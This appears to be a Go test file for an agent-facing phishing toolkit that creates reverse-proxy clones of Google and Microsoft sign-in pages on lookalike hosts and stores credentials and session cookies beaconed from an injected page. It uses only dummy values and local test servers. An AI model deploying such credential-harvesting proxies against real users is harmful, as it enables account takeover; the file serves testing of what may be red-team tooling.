package server

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/Autumn-27/behemoth/phish"
)

// newPhishTestServer builds a bare server with only what the phish tools need.
func newPhishTestServer(t *testing.T) *Server {
	t.Helper()
	return &Server{dataDir: t.TempDir()}
}

func callPhishTool(t *testing.T, s *Server, name string, args string) map[string]any {
	t.Helper()
	var found bool
	for _, tl := range s.phishTools() {
		if tl.Name() != name {
			continue
		}
		found = true
		res, err := tl.Call(context.Background(), json.RawMessage(args), nil)
		if err != nil {
			t.Fatalf("%s call: %v", name, err)
		}
		if len(res.Content) == 0 {
			t.Fatalf("%s: empty result", name)
		}
		text := res.Content[0].Text
		if strings.HasPrefix(text, "Error:") {
			t.Fatalf("%s returned error: %s", name, text)
		}
		var out map[string]any
		if err := json.Unmarshal([]byte(text), &out); err != nil {
			t.Fatalf("%s: non-JSON result %q: %v", name, text, err)
		}
		return out
	}
	if !found {
		t.Fatalf("tool %s not registered", name)
	}
	return nil
}

func TestPhishToolSetRegistered(t *testing.T) {
	s := newPhishTestServer(t)
	want := map[string]bool{"manage_phish_site": false, "phish_captures": false}
	for _, tl := range s.phishTools() {
		if _, ok := want[tl.Name()]; ok {
			want[tl.Name()] = true
		}
		if tl.Description() == "" {
			t.Errorf("%s: empty description", tl.Name())
		}
	}
	for name, seen := range want {
		if !seen {
			t.Errorf("tool %s missing from phishTools()", name)
		}
	}
}

func TestManagePhishSiteFlow(t *testing.T) {
	s := newPhishTestServer(t)

	out := callPhishTool(t, s, "manage_phish_site", `{"action":"create","label":"google clone","target_url":"https://accounts.google.com","hosts":"signin.acme-sso.net","bot_action":"passthrough"}`)
	siteRaw, ok := out["site"].(map[string]any)
	if !ok {
		t.Fatalf("site missing: %v", out)
	}
	id, _ := siteRaw["id"].(string)
	if !strings.HasPrefix(id, "ph_") {
		t.Fatalf("site id: %v", siteRaw["id"])
	}
	if siteRaw["mode"] != "proxy" || siteRaw["bot_action"] != "passthrough" {
		t.Fatalf("site defaults: %+v", siteRaw)
	}
	if listener, _ := out["listener"].(string); listener == "" {
		t.Fatalf("listener missing: %v", out)
	}
	// Duplicate host rejected.
	for _, tl := range s.phishTools() {
		if tl.Name() != "manage_phish_site" {
			continue
		}
		res, err := tl.Call(context.Background(), json.RawMessage(`{"action":"create","target_url":"https://login.microsoftonline.com","hosts":"signin.acme-sso.net"}`), nil)
		if err != nil {
			t.Fatalf("call: %v", err)
		}
		if !strings.Contains(res.Content[0].Text, "already used") {
			t.Fatalf("expected host conflict, got: %s", res.Content[0].Text)
		}
	}

	// List shows the site.
	list := callPhishTool(t, s, "manage_phish_site", `{"action":"list"}`)
	if n, _ := list["count"].(float64); n != 1 {
		t.Fatalf("list count: %v", list["count"])
	}

	// Disable + delete.
	callPhishTool(t, s, "manage_phish_site", `{"action":"disable","site_id":"`+id+`"}`)
	callPhishTool(t, s, "manage_phish_site", `{"action":"delete","site_id":"`+id+`"}`)
	list2 := callPhishTool(t, s, "manage_phish_site", `{"action":"list"}`)
	if n, _ := list2["count"].(float64); n != 0 {
		t.Fatalf("list count after delete: %v", list2["count"])
	}
}

func TestPhishCapturesViaTool(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, `<html><body><form action="http://%s/do"><input name="user"><input type="password" name="pw"></form></body></html>`, r.Host)
	}))
	defer upstream.Close()

	s := newPhishTestServer(t)
	out := callPhishTool(t, s, "manage_phish_site", `{"action":"create","target_url":"`+upstream.URL+`","hosts":"cap.example.net","capture":true}`)
	siteRaw, _ := out["site"].(map[string]any)
	id, _ := siteRaw["id"].(string)

	// Simulate a beacon the injected page would send.
	mgr := s.phishManager()
	if mgr == nil {
		t.Fatal("phish manager nil")
	}
	req := httptest.NewRequest("POST", "http://cap.example.net/__bhm/collect",
		strings.NewReader(`{"url":"http://cap.example.net/","fields":{"user":"jane","pw":"s3cret"},"cookies":[{"name":"SESS","value":"tok"}]}`))
	req.Header.Set("Host", "cap.example.net")
	rec := httptest.NewRecorder()
	phish.NewHandler(mgr).ServeHTTP(rec, req)
	if rec.Code != 204 {
		t.Fatalf("collect status: %d", rec.Code)
	}

	caps := callPhishTool(t, s, "phish_captures", `{"site_id":"`+id+`"}`)
	list, _ := caps["captures"].([]any)
	if len(list) != 1 {
		t.Fatalf("captures: %v", caps)
	}
	first, _ := list[0].(map[string]any)
	if first["username"] != "jane" || first["password"] != "s3cret" {
		t.Fatalf("capture fields: %v", first)
	}

	// Unknown site id errors.
	for _, tl := range s.phishTools() {
		if tl.Name() != "phish_captures" {
			continue
		}
		res, err := tl.Call(context.Background(), json.RawMessage(`{"site_id":"ph_nope"}`), nil)
		if err != nil {
			t.Fatalf("call: %v", err)
		}
		if !strings.Contains(res.Content[0].Text, "unknown phish site") {
			t.Fatalf("unexpected: %s", res.Content[0].Text)
		}
	}
}
